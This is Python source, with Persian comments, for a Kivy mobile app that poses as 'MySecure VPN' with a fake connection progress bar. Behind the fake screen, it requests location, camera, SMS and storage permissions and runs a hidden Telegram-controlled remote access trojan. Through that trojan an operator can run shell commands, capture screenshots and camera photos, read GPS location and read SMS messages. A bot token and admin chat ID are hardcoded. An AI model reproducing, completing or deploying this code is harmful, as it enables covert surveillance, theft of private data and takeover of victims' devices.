from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.progressbar import ProgressBar
from kivy.clock import Clock
from kivy.animation import Animation
import threading
import telebot  # یا pyTelegramBotAPI اگر آپدیت کنی
import subprocess
import os
import time

# Plyer رو try کن
try:
    from plyer import gps, camera, battery, sms, screenshot
    PLYER_AVAILABLE = True
except ImportError:
    PLYER_AVAILABLE = False
    print("Plyer not available – install with pip install plyer")

# Android permissions (فقط در APK)
try:
    from android.permissions import request_permissions, Permission
    ANDROID_AVAILABLE = True
except ImportError:
    ANDROID_AVAILABLE = False
    print("Android permissions not available – desktop mode (normal)")

# تنظیمات
TOKEN = '8287220235:AAHEWZIYxlep2L0wB1PmV8YgUQiawsFDVCc'
ADMIN_CHAT_ID = '7247469975'
bot = telebot.TeleBot(TOKEN)

# مجوزها
def request_all_permissions():
    if ANDROID_AVAILABLE:
        permissions = [
            Permission.ACCESS_FINE_LOCATION,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_SMS,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.INTERNET
        ]
        request_permissions(permissions)
    else:
        print("Permissions skipped – running on desktop")

# GPS
location = {}
def on_gps_location(**kwargs):
    global location
    location = kwargs

def get_location():
    if PLYER_AVAILABLE:
        try:
            gps.configure(on_location=on_gps_location)
            gps.start(minTime=1000, minDistance=1)
            time.sleep(3)  # صبر برای دریافت location
            gps.stop()
            return f"Lat: {location.get('lat', 'N/A')}, Lon: {location.get('lon', 'N/A')}"
        except Exception as e:
            return f"GPS Error: {str(e)}"
    else:
        return "GPS not available on desktop"

# Shell
def run_shell(cmd):
    try:
        if os.name == 'nt':  # ویندوز
            result = subprocess.check_output(['cmd', '/c', cmd], text=True, stderr=subprocess.STDOUT)
        else:  # لینوکس/اندروید
            result = subprocess.check_output(['sh', '-c', cmd], text=True, stderr=subprocess.STDOUT)
        return result.strip()
    except Exception as e:
        return f"Shell Error: {str(e)}"

# Screenshot
def take_screenshot():
    if PLYER_AVAILABLE:
        try:
            path = 'screen.png'
            screenshot.save(path)
            if os.path.exists(path):
                return path
            return None
        except Exception as e:
            print(f"Screenshot error: {e}")
            return None
    else:
        return None

# Camera
def take_photo():
    if PLYER_AVAILABLE:
        try:
            path = 'photo.jpg'
            camera.take_picture(path, sh=(640, 480))
            if os.path.exists(path):
                return path
            return None
        except Exception as e:
            print(f"Camera error: {e}")
            return None
    else:
        return None

# SMS
def list_sms():
    if PLYER_AVAILABLE:
        try:
            sms_list = sms.inbox()
            messages = [msg.body for msg in sms_list[:3]]
            return "\n".join(messages) if messages else "No SMS found"
        except Exception as e:
            return f"SMS Error: {str(e)}"
    else:
        return "SMS not available on desktop"

# بات handlers
@bot.message_handler(commands=['start'])
def start_handler(message):
    if str(message.chat.id) == ADMIN_CHAT_ID:
        bot.reply_to(message, "RAT connected! (VPN Mode) /help")

@bot.message_handler(commands=['sysinfo'])
def sysinfo_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    try:
        bat = f"{battery.status.get('percentage', 'N/A')}%"
    except:
        bat = 'N/A'
    model = run_shell('getprop ro.product.model' if ANDROID_AVAILABLE else ('systeminfo' if os.name == 'nt' else 'uname -a'))
    info = f"OS: {'Android' if ANDROID_AVAILABLE else 'Desktop'}\nBattery: {bat}\nModel: {model[:100]}..."
    bot.reply_to(message, info)

@bot.message_handler(commands=['shell'])
def shell_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    cmd = message.text.split(' ', 1)[1] if len(message.text.split()) > 1 else ('dir' if os.name == 'nt' else 'ls')
    result = run_shell(cmd)
    bot.reply_to(message, f"Output:\n```{result[:4000]}```")  # Markdown برای کد

@bot.message_handler(commands=['screenshot'])
def screenshot_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    path = take_screenshot()
    if path and os.path.exists(path):
        with open(path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(path)
        bot.reply_to(message, "Screenshot sent!")
    else:
        bot.reply_to(message, "Screenshot failed (check permissions)")

@bot.message_handler(commands=['location'])
def location_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    loc = get_location()
    bot.reply_to(message, f"Location:\n{loc}")

@bot.message_handler(commands=['camera'])
def camera_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    path = take_photo()
    if path and os.path.exists(path):
        with open(path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)
        os.remove(path)
        bot.reply_to(message, "Photo sent!")
    else:
        bot.reply_to(message, "Camera failed (check permissions)")

@bot.message_handler(commands=['sms'])
def sms_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    sms_text = list_sms()
    bot.reply_to(message, f"SMS (last 3):\n{sms_text}")

@bot.message_handler(commands=['help'])
def help_handler(message):
    if str(message.chat.id) != ADMIN_CHAT_ID: return
    help_text = """
/start - اتصال
/sysinfo - اطلاعات سیستم
/shell <cmd> - اجرای شل
/screenshot - اسکرین‌شات
/location - موقعیت GPS
/camera - عکس از دوربین
/sms - لیست SMS
/help - راهنما
    """
    bot.reply_to(message, help_text)

# UI VPN
class VPNWidget(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.padding = 20
        self.spacing = 10

        # عنوان
        title = Label(text='MySecure VPN', font_size='24sp', size_hint_y=None, height=60, bold=True)
        self.add_widget(title)

        # وضعیت
        self.status_label = Label(text='Disconnected', size_hint_y=None, height=30, color=(1, 0, 0, 1))
        self.add_widget(self.status_label)

        # پروگرس بار
        self.progress = ProgressBar(max=100, value=0, size_hint_y=None, height=20)
        self.add_widget(self.progress)

        # دکمه Connect
        self.connect_btn = Button(text='Connect VPN', size_hint_y=None, height=50, background_color=(0.2, 0.6, 0.2, 1))
        self.connect_btn.bind(on_press=self.connect_vpn)
        self.add_widget(self.connect_btn)

        # دکمه Disconnect
        self.disconnect_btn = Button(text='Disconnect', disabled=True, size_hint_y=None, height=50, background_color=(0.6, 0.2, 0.2, 1))
        self.disconnect_btn.bind(on_press=self.disconnect_vpn)
        self.add_widget(self.disconnect_btn)

    def connect_vpn(self, instance):
        self.status_label.text = 'Connecting...'
        self.status_label.color = (0.6, 0.6, 0, 1)
        self.connect_btn.disabled = True
        self.disconnect_btn.disabled = False

        # انیمیشن فیک اتصال
        def update_progress(dt):
            if self.progress.value < 100:
                self.progress.value += 2
            else:
                self.progress.value = 0
                self.status_label.text = 'Connected ✓'
                self.status_label.color = (0, 0.6, 0, 1)
                Clock.unschedule(update_progress)

        Clock.schedule_interval(update_progress, 0.1)

    def disconnect_vpn(self, instance):
        self.status_label.text = 'Disconnected'
        self.status_label.color = (1, 0, 0, 1)
        self.progress.value = 0
        self.connect_btn.disabled = False
        self.disconnect_btn.disabled = True

# Kivy App
class RATVPNApp(App):
    def build(self):
        return VPNWidget()

    def on_start(self):
        request_all_permissions()
        # Thread برای polling بات (در پس‌زمینه)
        def polling():
            while True:
                try:
                    bot.polling(none_stop=True, interval=0, timeout=20)
                except Exception as e:
                    print(f"Polling error: {e}")
                    time.sleep(15)
        thread = threading.Thread(target=polling, daemon=True)
        thread.start()
        print("RAT VPN App started – Bot polling active")

if __name__ == '__main__':
    RATVPNApp().run()